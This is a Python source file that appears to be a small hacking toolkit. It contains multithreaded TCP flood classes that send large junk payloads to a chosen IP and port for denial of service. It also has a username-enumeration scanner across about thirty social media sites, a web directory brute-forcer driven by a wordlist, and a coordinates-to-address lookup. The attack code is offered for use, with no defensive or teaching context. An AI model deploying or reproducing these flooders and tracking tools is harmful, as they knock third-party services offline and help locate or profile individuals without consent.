import os
import socket
import threading
import requests

class DDOS:

    def start(target_ip, target_port, num_threads, packet_size_mb=50):
        target_address = (target_ip, target_port)
        packet_size = packet_size_mb * 1024 * 1024
    
        def attack():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect(target_address)
                    payload = b'A' * packet_size
                    s.sendto(payload, target_address)
                    s.close()
                    print(f"    {hashtag_red} {c.cyan('Attacking')}")
                except:
                    pass
    
        for _ in range(num_threads):
            thread = threading.Thread(target=attack)
            thread.start()

class d:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def attack(self, packet_size):
        def send_packet():
            try:
                self.sock.connect((self.target_ip, self.target_port))
                while True:
                    self.sock.send(b"A" * packet_size)
            except:
                pass

        attack_thread = threading.Thread(target=send_packet)
        attack_thread.start()

class c:
    @staticmethod
    def red(text):
        return f"\033[1;91m{text}\033[0m"

    @staticmethod
    def orange(text):
        return f"\033[1;38;5;202m{text}\033[0m"

    @staticmethod
    def yellow(text):
        return f"\033[1;93m{text}\033[0m"

    @staticmethod
    def green(text):
        return f"\033[1;92m{text}\033[0m"

    @staticmethod
    def blue(text):
        return f"\033[1;94m{text}\033[0m"

    @staticmethod
    def magenta(text):
        return f"\033[1;35m{text}\033[0m"  # Magenta (not pink)

    @staticmethod
    def cyan(text):
        return f"\033[1;96m{text}\033[0m"

    @staticmethod
    def purple(text):
        return f"\033[1;38;5;129m{text}\033[0m"

    @staticmethod
    def pink(text):
        return f"\033[1;38;5;219m{text}\033[0m"

    @staticmethod
    def black(text):
        return f"\033[1;38;5;232m{text}\033[0m"

    @staticmethod
    def gray(text):
        return f"\033[1;38;5;245m{text}\033[0m"

    @staticmethod
    def white(text):
        return f"\033[1;97m{text}\033[0m"


hashtag_red = rf"{c.cyan('[')}{c.yellow('#')}{c.cyan(']')}"
more_red = rf"{c.cyan('[')}{c.yellow('+')}{c.cyan(']')}"
quest_red = rf"{c.cyan('[')}{c.yellow('?')}{c.cyan(']')}"
minus_red = rf"{c.cyan('[')}{c.yellow('-')}{c.cyan(']')}"

class r:
    def recon(username):
        social_media_sites = [
        "https://www.facebook.com/",
        "https://www.instagram.com/",
        "https://www.twitter.com/",
        "https://www.linkedin.com/in/",
        "https://www.youtube.com/user/",
        "https://www.pinterest.com/",
        "https://www.snapchat.com/add/",
        "https://www.reddit.com/user/",
        "https://www.tiktok.com/@",
        "https://www.twitch.tv/",
        "https://www.whatsapp.com/",
        "https://www.vk.com/",
        "https://www.tumblr.com/",
        "https://www.flickr.com/people/",
        "https://www.medium.com/@",
        "https://www.soundcloud.com/",
        "https://www.github.com/",
        "https://www.behance.net/",
        "https://www.dribbble.com/",
        "https://www.deviantart.com/",
        "https://www.behance.net/",
        "https://www.producthunt.com/@",
        "https://www.stackoverflow.com/users/",
        "https://www.quora.com/profile/",
        "https://www.goodreads.com/user/show/",
        "https://www.wattpad.com/user/",
        "https://www.behance.net/",
        "https://www.vimeo.com/",
        "https://www.disqus.com/by/"
        "https://www.patreon.com/"
    ]

        for site in social_media_sites:
            url = site + username
            response = requests.get(url)
            if response.status_code == 200:
                print(f"    {c.cyan('[')}{c.yellow('+')}{c.cyan(']')}{c.green(' Acc Found: ')} {c.green(url)}")
            else:
                print(f"    {more_red} {c.yellow('Not Found: ')} {c.yellow(site)}")

class f:
    def dir(url, wordlist):
        with open(wordlist, "r") as file:
            for line in file:
                directory = line.strip()
                full_url = f"{url}/{directory}"
                response = requests.get(full_url)
                if response.status_code == 200:
                    print(f"{more_red} {c.green('Found: ')}{c.green(full_url)}")
                elif response.status_code == 403:
                    print(f"{quest_red} {c.cyan('Forbidden: ')}{c.cyan(full_url)}")
                elif response.status_code == 404:
                    print(f"{minus_red} {c.yellow('Not Found: ')}{c.yellow(full_url)}")

class adress:

    def obter_endereco(lat, long):
        
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={long}&format=json"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            endereco = data.get("display_name")
            return endereco
        return None
